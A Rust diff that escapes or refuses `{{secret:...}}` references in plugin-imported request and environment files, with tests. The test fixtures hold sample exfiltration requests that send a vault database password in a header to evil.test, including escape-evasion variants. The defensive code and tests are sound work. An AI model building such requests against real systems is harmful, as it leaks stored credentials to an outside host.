@@ -10,6 +10,7 @@ use crate::error::ConfigError;
 use crate::model::{KindRegistry, REQUEST_FILE_SUFFIX, Request};
 use crate::plugins::{Extensions, ImportedFiles};
 use crate::secrets::STATE_DIR;
+use crate::secrets::provider::neutralize_references;
 
 /// What to do with a file that already exists.
 #[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
@@ -27,6 +28,9 @@ pub struct Planned {
     /// Relative to the workspace root, with `/`.
     pub path: String,
     pub content: String,
+    /// The `{{secret:...}}` references of the plugin's output written
+    /// escaped, as literal text (issue #95).
+    pub neutralized: Vec<String>,
 }
 
 /// What happened to a planned file.
@@ -57,21 +61,149 @@ pub fn plan(
     let mut planned = Vec::new();
     for (path, content) in &files.requests {
         let path = relative(path, REQUEST_FILE_SUFFIX).map_err(fail)?;
-        check_request(&path, content, extensions).map_err(fail)?;
+        let check = |text: &str| check_request(&path, text, extensions);
+        let (content, neutralized) = inert(&path, content, check).map_err(fail)?;
         planned.push(Planned {
             path: join(into, &path),
-            content: content.clone(),
+            content,
+            neutralized,
         });
     }
     for (path, content) in &files.environments {
         let path = relative(path, ".yaml").map_err(fail)?;
-        check_environment(&path, content).map_err(fail)?;
+        let check = |text: &str| check_environment(&path, text);
+        let (content, neutralized) = inert(&path, content, check).map_err(fail)?;
         planned.push(Planned {
             path: join(ENVIRONMENTS_DIR, &path),
-            content: content.clone(),
+            content,
+            neutralized,
         });
     }
     Ok(planned)
+}
+
+/// `content` checked by `check`, with every live `{{secret:...}}`
+/// reference escaped (issue #95): a plugin converts an external document,
+/// which must not plant a reference to a local secret. Returns the text to
+/// write and the references neutralized. The escape is made in the YAML
+/// text, so a file where that cannot work (a reference in a double-quoted
+/// scalar, or spelled with YAML escapes) is refused rather than written
+/// with a live reference.
+fn inert(
+    path: &str,
+    content: &str,
+    check: impl Fn(&str) -> Result<(), String>,
+) -> Result<(String, Vec<String>), String> {
+    check(content)?;
+    let mut text = content.to_owned();
+    let found = neutralize_references(&mut text);
+    let refuse = || {
+        format!(
+            "{path}: holds a secret reference ({{{{secret:...}}}}) that cannot be neutralized; \
+             imported files may not reference local secrets"
+        )
+    };
+    if !found.is_empty() {
+        check(&text).map_err(|_| refuse())?;
+    }
+    if holds_live_reference(&text) {
+        return Err(refuse());
+    }
+    Ok((text, found))
+}
+
+/// Whether a string of the YAML document `text` (a key or a value, as
+/// parsed) still holds a live secret reference. A document that cannot be
+/// read here is taken to hold one when it mentions `secret:` at all.
+fn holds_live_reference(text: &str) -> bool {
+    match crate::format::from_yaml::<YamlStrings>(Path::new("plugin-output.yaml"), text) {
+        Ok(YamlStrings(strings)) => strings
+            .into_iter()
+            .any(|mut s| !neutralize_references(&mut s).is_empty()),
+        Err(_) => text.contains("secret:"),
+    }
+}
+
+/// Every string of a YAML document, map keys included.
+struct YamlStrings(Vec<String>);
+
+impl<'de> serde::Deserialize<'de> for YamlStrings {
+    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
+        let mut strings = Vec::new();
+        serde::de::DeserializeSeed::deserialize(Collect(&mut strings), deserializer)?;
+        Ok(Self(strings))
+    }
+}
+
+struct Collect<'a>(&'a mut Vec<String>);
+
+impl<'de> serde::de::DeserializeSeed<'de> for Collect<'_> {
+    type Value = ();
+
+    fn deserialize<D: serde::Deserializer<'de>>(self, deserializer: D) -> Result<(), D::Error> {
+        deserializer.deserialize_any(self)
+    }
+}
+
+impl<'de> serde::de::Visitor<'de> for Collect<'_> {
+    type Value = ();
+
+    fn expecting(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.write_str("any YAML value")
+    }
+
+    fn visit_str<E: serde::de::Error>(self, v: &str) -> Result<(), E> {
+        self.0.push(v.to_owned());
+        Ok(())
+    }
+
+    fn visit_bool<E: serde::de::Error>(self, _: bool) -> Result<(), E> {
+        Ok(())
+    }
+
+    fn visit_i64<E: serde::de::Error>(self, _: i64) -> Result<(), E> {
+        Ok(())
+    }
+
+    fn visit_i128<E: serde::de::Error>(self, _: i128) -> Result<(), E> {
+        Ok(())
+    }
+
+    fn visit_u64<E: serde::de::Error>(self, _: u64) -> Result<(), E> {
+        Ok(())
+    }
+
+    fn visit_u128<E: serde::de::Error>(self, _: u128) -> Result<(), E> {
+        Ok(())
+    }
+
+    fn visit_f64<E: serde::de::Error>(self, _: f64) -> Result<(), E> {
+        Ok(())
+    }
+
+    fn visit_unit<E: serde::de::Error>(self) -> Result<(), E> {
+        Ok(())
+    }
+
+    fn visit_none<E: serde::de::Error>(self) -> Result<(), E> {
+        Ok(())
+    }
+
+    fn visit_some<D: serde::Deserializer<'de>>(self, d: D) -> Result<(), D::Error> {
+        serde::de::DeserializeSeed::deserialize(self, d)
+    }
+
+    fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut seq: A) -> Result<(), A::Error> {
+        while seq.next_element_seed(Collect(&mut *self.0))?.is_some() {}
+        Ok(())
+    }
+
+    fn visit_map<A: serde::de::MapAccess<'de>>(self, mut map: A) -> Result<(), A::Error> {
+        while map.next_key_seed(Collect(&mut *self.0))?.is_some() {
+            map.next_value_seed(Collect(&mut *self.0))?;
+        }
+        Ok(())
+    }
 }
 
 /// `path` as plain relative parts ending in `suffix`: no absolute path, no
@@ -255,6 +387,76 @@ mod tests {
         );
     }
 
+    /// Issue #95: a reference the plugin copied from the source document is
+    /// written escaped and listed; plain variables and escaped references
+    /// are kept as they are.
+    #[test]
+    fn secret_references_are_neutralized() {
+        let request = "version: 1\nkind: http\nname: leak\nurl: https://evil.test/{{base}}\n\
+                       headers:\n\
+                       - name: X-Db\n  value: pw={{secret:vault/kv/prod/db#password}}\n\
+                       - name: X-Single\n  value: 'a {{secret:vault/kv/a#b}}'\n\
+                       - name: X-Literal\n  value: \\{{secret:vault/kv/c#d}}\n";
+        let env = "variables:\n  pw: \"{{base}}\"\n  db: '{{secret:vault/kv/prod/db#password}}'\n";
+        let planned = plan(
+            "",
+            &files(&[("leak.rman.yaml", request)], &[("dev.yaml", env)]),
+            &NoKinds,
+        )
+        .unwrap();
+        assert_eq!(
+            planned[0].neutralized,
+            [
+                "{{secret:vault/kv/prod/db#password}}",
+                "{{secret:vault/kv/a#b}}"
+            ]
+        );
+        assert!(
+            planned[0]
+                .content
+                .contains("value: pw=\\{{secret:vault/kv/prod/db#password}}")
+        );
+        assert!(planned[0].content.contains("'a \\{{secret:vault/kv/a#b}}'"));
+        assert!(
+            planned[0]
+                .content
+                .contains("value: \\{{secret:vault/kv/c#d}}")
+        );
+        assert!(planned[0].content.contains("https://evil.test/{{base}}"));
+        assert_eq!(
+            planned[1].neutralized,
+            ["{{secret:vault/kv/prod/db#password}}"]
+        );
+        assert!(!holds_live_reference(&planned[0].content));
+        assert!(!holds_live_reference(&planned[1].content));
+        let clean = plan("", &files(&[("one.rman.yaml", REQUEST)], &[]), &NoKinds).unwrap();
+        assert!(clean[0].neutralized.is_empty());
+        assert_eq!(clean[0].content, REQUEST);
+    }
+
+    /// A reference the YAML text cannot escape (double-quoted, or spelled
+    /// with YAML escapes) refuses the import rather than writing it live.
+    #[test]
+    fn secret_references_that_cannot_be_escaped_are_refused() {
+        for header in [
+            "\"{{secret:vault/kv/prod/db#password}}\"",
+            "\"\\x7B{secret:vault/kv/prod/db#password}}\"",
+        ] {
+            let request = format!(
+                "version: 1\nkind: http\nname: leak\nurl: https://evil.test/\n\
+                 headers:\n- name: X-Db\n  value: {header}\n"
+            );
+            let error =
+                plan("", &files(&[("leak.rman.yaml", &request)], &[]), &NoKinds).unwrap_err();
+            assert_eq!(
+                error,
+                "plugin soapui: leak.rman.yaml: holds a secret reference ({{secret:...}}) \
+                 that cannot be neutralized; imported files may not reference local secrets",
+                "{header}"
+            );
+        }
+    }
+
     #[test]
     fn paths_stay_in_their_folder() {
         for path in [
@@ -283,6 +485,7 @@ mod tests {
         let planned = [Planned {
             path: "a/one.rman.yaml".into(),
             content: "new".into(),
+            neutralized: Vec::new(),
         }];
         assert_eq!(
             write(dir.path(), &planned, OnConflict::Skip).unwrap(),
